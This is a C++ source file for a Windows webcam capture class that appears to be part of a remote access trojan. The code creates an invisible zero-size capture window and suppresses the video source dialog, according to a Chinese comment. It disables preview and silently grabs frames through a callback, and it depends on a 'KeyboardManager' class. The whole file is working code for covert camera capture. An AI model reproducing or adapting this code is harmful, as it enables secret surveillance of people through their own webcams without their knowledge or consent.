// VideoCap.cpp: implementation of the CVideoCap class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "KeyboardManager.h"
#include "VideoCap.h"


//#include <DShow.h>
//#pragma comment(lib, "strmiids.lib")

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
BOOL CVideoCap::m_bIsConnected = FALSE;

CVideoCap::CVideoCap()
{
	// If FALSE, the system automatically resets the state to nonsignaled after a single waiting thread has been released.
	m_hCaptureEvent = CreateEvent(NULL, FALSE, FALSE, NULL);

	m_lpbmi = NULL;
	m_lpDIB = NULL;

	if (!IsWebCam() || m_bIsConnected)
		return;
	m_hWnd = CreateWindow("#32770", /* Dialog */ "", WS_POPUP, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
	m_hWndCap = CKeyboardManager::MycapCreateCaptureWindow
		(
		"CVideoCap", 
		WS_CHILD | WS_VISIBLE,
		0,
		0,
		0,
		0,
		m_hWnd,
		0
		);
}

CVideoCap::~CVideoCap()
{
	if (m_bIsConnected)
	{
		capCaptureAbort(m_hWndCap);
		capDriverDisconnect(m_hWndCap);

		if (m_lpbmi)
			delete m_lpbmi;
		if (m_lpDIB)
			delete m_lpDIB;
		m_bIsConnected = FALSE;
	}

	capSetCallbackOnError(m_hWndCap, NULL);
	capSetCallbackOnFrame(m_hWndCap, NULL);	

	CloseWindow(m_hWnd);
	CloseWindow(m_hWndCap);

	CloseHandle(m_hCaptureEvent);
}
// 自定义错误,不让弹出视频源对话框
LRESULT CALLBACK CVideoCap::capErrorCallback(HWND hWnd,	int nID, LPCSTR lpsz)
{
	return (LRESULT)TRUE;
}

LRESULT CALLBACK CVideoCap::FrameCallbackProc(HWND hWnd, LPVIDEOHDR lpVHdr)
{

		CVideoCap *pThis = (CVideoCap *)capGetUserData(hWnd);
		if (pThis != NULL)
		{
			memcpy(pThis->m_lpDIB, lpVHdr->lpData, pThis->m_lpbmi->bmiHeader.biSizeImage);
			SetEvent(pThis->m_hCaptureEvent);
		}
	
	return 0;
}

//////////////////////////////////////////////////////////////////////////
//*
#include <InitGuid.h>

// 62BE5D10-60EB-11d0-BD3B-00A0C911CE86                 ICreateDevEnum
DEFINE_GUID(CLSID_SystemDeviceEnum_TSP,
			   0x62BE5D10,0x60EB,0x11d0,0xBD,0x3B,0x00,0xA0,0xC9,0x11,0xCE,0x86);

DEFINE_GUID(CLSID_VideoInputDeviceCategory_TSP,
			   0x860BB310,0x5D01,0x11d0,0xBD,0x3B,0x00,0xA0,0xC9,0x11,0xCE,0x86);

DEFINE_GUID(IID_IPropertyBag_TSP,
			0x55272A00,0x42CB,0x11CE,0x81,0x35,0x00,0xAA,0x00,0x4B,0xB8,0x51);

DEFINE_GUID(IID_ICreateDevEnum_TSP,
			0x29840822,0x5B84,0x11D0,0xBD,0x3B,0x00,0xA0,0xC9,0x11,0xCE,0x86);

class ICreateDevEnum : public IUnknown
{
public:
	virtual HRESULT STDMETHODCALLTYPE CreateClassEnumerator( 
		REFCLSID clsidDeviceClass,
		__out  IEnumMoniker **ppEnumMoniker,
		DWORD dwFlags) = 0;

};
//*/
//////////////////////////////////////////////////////////////////////////

BOOL CVideoCap::IsWebCam()
{	
	::CoInitialize(NULL);

	ICreateDevEnum *lpCreateDevEnum = NULL;
	HRESULT hr = ::CoCreateInstance(CLSID_SystemDeviceEnum_TSP, NULL, CLSCTX_INPROC_SERVER, IID_ICreateDevEnum_TSP, (void**)&lpCreateDevEnum);
	if (NOERROR != hr)
	{	
		::CoUninitialize();
		return FALSE;
	}

	IEnumMoniker *lpEmumtor = NULL;
	hr = lpCreateDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory_TSP, &lpEmumtor, 0);
	if (NOERROR != hr)
	{
		lpCreateDevEnum->Release();
		::CoUninitialize();
		return FALSE;
	}

	lpEmumtor->Reset();
	BOOL bRet = FALSE;
	while (TRUE)
	{
		ULONG cFetched = 0;
		IMoniker *lpMon = NULL;
		hr = lpEmumtor->Next(1, &lpMon, &cFetched);
		if (S_OK != hr)
		{
			break;
		}

		IPropertyBag *lpBag = NULL;
		hr = lpMon->BindToStorage(NULL, NULL, IID_IPropertyBag_TSP, (void **)&lpBag);
		if (SUCCEEDED(hr)) 
		{
			bRet = TRUE;

			lpBag->Release();
			break;
		}

		lpMon->Release();
	}

	lpEmumtor->Release();
	lpCreateDevEnum->Release();

	::CoUninitialize();

	return bRet;

#if 0
	// 已经连接了
	if (m_bIsConnected)
		return FALSE;

	BOOL	bRet = FALSE;

	char	lpszName[100], lpszVer[50];
	for (int i = 0; i < 10 && !bRet; i++)
	{
		bRet = CKeyboardManager::MycapGetDriverDescription(i, lpszName, sizeof(lpszName),
			lpszVer, sizeof(lpszVer));
	}
	return bRet;

#endif


}

LPBYTE CVideoCap::GetDIB()
{
	capGrabFrameNoStop(m_hWndCap);
	DWORD	dwRet = WaitForSingleObject(m_hCaptureEvent, 3000);

	if (dwRet == WAIT_OBJECT_0)
		return m_lpDIB;
	else
		return NULL;
}

BOOL CVideoCap::Initialize(int nWidth, int nHeight)
{
	if (!IsWebCam())
		return FALSE;

	if (!capSetUserData(m_hWndCap, this))
	{
		return FALSE;
	}

	capSetCallbackOnError(m_hWndCap, capErrorCallback);
	if (!capSetCallbackOnFrame(m_hWndCap, FrameCallbackProc))
	{
		return FALSE;
	}

	// 将捕获窗同驱动器连接
	int i = 0;
	for (int i = 0; i < 10; i++)
	{
		if (capDriverConnect(m_hWndCap, i))
			break;
	}
	if (i == 10)
		return FALSE;
	
	
	DWORD dwSize = capGetVideoFormatSize(m_hWndCap);
	if (0 == dwSize)
	{
		return FALSE;
	}

	m_lpbmi = new BITMAPINFO;

	// M263只支持176*144 352*288 (352*288 24彩的试验只支持biPlanes = 1)
	DWORD dwRet = capGetVideoFormat(m_hWndCap, m_lpbmi, dwSize);
	if (0 == dwRet)
	{
		return FALSE;
	}

	// 采用指定的大小
	if (nWidth && nHeight)
	{
 		m_lpbmi->bmiHeader.biWidth = nWidth;
 		m_lpbmi->bmiHeader.biHeight = nHeight;
		m_lpbmi->bmiHeader.biPlanes = 1;
		m_lpbmi->bmiHeader.biSizeImage = (((m_lpbmi->bmiHeader.biWidth * m_lpbmi->bmiHeader.biBitCount + 31) & ~31) >> 3) * m_lpbmi->bmiHeader.biHeight;
		// 实验得知一些摄像头不支持指定的分辩率
 		if (!capSetVideoFormat(m_hWndCap, m_lpbmi, sizeof(BITMAPINFO)))
			return FALSE;
	}

	m_lpDIB = new BYTE[m_lpbmi->bmiHeader.biSizeImage];

	CAPDRIVERCAPS gCapDriverCaps = {0};
	capDriverGetCaps(m_hWndCap, &gCapDriverCaps, sizeof(CAPDRIVERCAPS));
	
	capOverlay(m_hWndCap, FALSE);
	capPreview(m_hWndCap, FALSE);	
	capPreviewScale(m_hWndCap, FALSE);

	m_bIsConnected = TRUE;

	return TRUE;
}
